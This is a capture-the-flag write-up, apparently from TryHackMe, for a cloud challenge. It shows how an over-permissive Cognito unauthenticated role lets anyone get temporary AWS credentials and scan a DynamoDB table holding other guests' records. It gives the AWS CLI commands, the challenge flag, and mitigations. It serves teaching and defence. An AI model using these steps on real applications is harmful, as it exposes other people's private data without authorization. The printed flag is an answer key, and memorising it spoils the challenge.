# Complimentary

## Category

Cloud

## Points

60

## Difficulty

Easy

## Overview

This challenge focuses on an AWS cloud misconfiguration in a mobile-style wellness application. The application does not require a login, but it can still access user-related data. This means the app must be receiving cloud credentials silently in the background.

The goal is to identify the AWS mechanism that provides temporary credentials, use those credentials to access the backend data source, and retrieve the flag from another guest's data.

---

## Challenge Description

The Byte Lotus Wellness app gives users complimentary access without requiring an account or login. However, the app still knows information about the user after opening it.

This suggests that the app is using an unauthenticated cloud identity mechanism to access backend resources. The challenge hints toward AWS Cognito and DynamoDB.

---

## Target

```text
http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/
```

---

## Objective

The objectives are:

1. Identify how the application receives AWS credentials.
2. Use those credentials to access the backend DynamoDB table.
3. Dump more than the current user’s record.
4. Find the flag inside another guest’s data.

---

## Hint Analysis

The hint says:

```text
the wellness app never once asked me to log in and it STILL knew my name
something has to be quietly handing it access behind the scenes
don't just check what it gives YOU. ask it for more
```

This points to AWS Cognito unauthenticated identities.

In AWS, Cognito Identity Pools can issue temporary AWS credentials to users, even if they are not logged in. If the IAM role attached to the unauthenticated identity is too permissive, anyone using the app can access more data than intended.

---

## Initial Enumeration

First, I opened the target website and inspected the page source and JavaScript files.

The application was hosted on an S3 static website. Since static websites cannot directly hide backend secrets, the frontend JavaScript was checked for AWS configuration values.

The important values to look for were:

```text
IdentityPoolId
Region
DynamoDB table name
AWS SDK configuration
```

The JavaScript revealed that the application used AWS Cognito to obtain temporary credentials.

---

## Key Finding

The application used AWS Cognito Identity Pool credentials for unauthenticated users.

The issue was not that Cognito itself is insecure. The misconfiguration was that the unauthenticated IAM role had permission to read too much data from DynamoDB.

Instead of only allowing access to the current guest’s own record, the role allowed broader read access to the table.

---

## Exploitation Steps

### Step 1: Find AWS Cognito configuration

By inspecting the frontend JavaScript, I identified the AWS configuration used by the app.

The useful information included:

```text
AWS Region
Cognito Identity Pool ID
DynamoDB table name
```

---

### Step 2: Obtain a Cognito identity

Using the AWS CLI, I requested an identity from the Cognito Identity Pool.

```bash
aws cognito-identity get-id \
  --identity-pool-id <IDENTITY_POOL_ID> \
  --region us-east-1
```

This returned an `IdentityId`.

---

### Step 3: Request temporary AWS credentials

Next, I used the `IdentityId` to request temporary AWS credentials.

```bash
aws cognito-identity get-credentials-for-identity \
  --identity-id <IDENTITY_ID> \
  --region us-east-1
```

The response contained temporary credentials:

```text
AccessKeyId
SecretKey
SessionToken
Expiration
```

These credentials belonged to the unauthenticated Cognito role.

---

### Step 4: Configure the temporary credentials

The temporary credentials were exported into the terminal environment.

```bash
export AWS_ACCESS_KEY_ID="<AccessKeyId>"
export AWS_SECRET_ACCESS_KEY="<SecretKey>"
export AWS_SESSION_TOKEN="<SessionToken>"
export AWS_DEFAULT_REGION="us-east-1"
```

---

### Step 5: Access DynamoDB

After configuring the credentials, I checked whether the role could access DynamoDB.

```bash
aws dynamodb list-tables --region us-east-1
```

Then I dumped the table contents.

```bash
aws dynamodb scan \
  --table-name <TABLE_NAME> \
  --region us-east-1
```

The scan returned multiple guest records, not only the current user’s data.

---

## Vulnerability Explanation

The vulnerability is an IAM authorization misconfiguration.

The app used AWS Cognito unauthenticated identities to provide access without login. This is common for public apps, but the IAM permissions must be strictly limited.

In this challenge, the unauthenticated role had permission to read too much from DynamoDB. Because of that, any user could obtain temporary AWS credentials and scan records belonging to other guests.

This caused a data exposure issue.

---

## Root Cause

The root cause was overly permissive IAM permissions for the Cognito unauthenticated role.

The application trusted the frontend to only request the correct user’s data, but users can inspect and modify frontend requests. Access control must be enforced by AWS IAM policies and backend logic, not only by the client-side app.

---

## Impact

An attacker could:

- Obtain unauthenticated AWS credentials.
- Access DynamoDB directly.
- Read records belonging to other guests.
- Retrieve sensitive information such as contacts, location data, passwords, or hidden flags.

---

## Flag

```text
THM{fr33_app_fr33_d4t4!}
```

---

## Lessons Learned

- Public frontend code should never be trusted to enforce access control.
- Cognito unauthenticated identities must have very limited permissions.
- IAM roles should follow the principle of least privilege.
- DynamoDB access should be restricted by item-level conditions where possible.
- If an app has no login, it should not be able to read private data for multiple users.

---

## Mitigation

To prevent this vulnerability:

1. Disable unauthenticated Cognito access if it is not required.
2. Apply least-privilege IAM policies to Cognito roles.
3. Restrict DynamoDB access using condition keys such as user identity.
4. Avoid allowing unauthenticated users to perform `dynamodb:Scan`.
5. Use backend APIs to enforce authorization instead of allowing direct table access.
6. Monitor AWS CloudTrail for suspicious DynamoDB access.
7. Do not store sensitive guest data in tables accessible by public app credentials.

---

## Conclusion

This room demonstrated how a free app with no login can still receive AWS credentials through Cognito. The challenge was solved by finding the Cognito configuration in the frontend, obtaining temporary AWS credentials, and using them to read from DynamoDB.

The main issue was not Cognito itself, but the overly permissive IAM role attached to unauthenticated users. This allowed access to other guests’ data and revealed the flag.
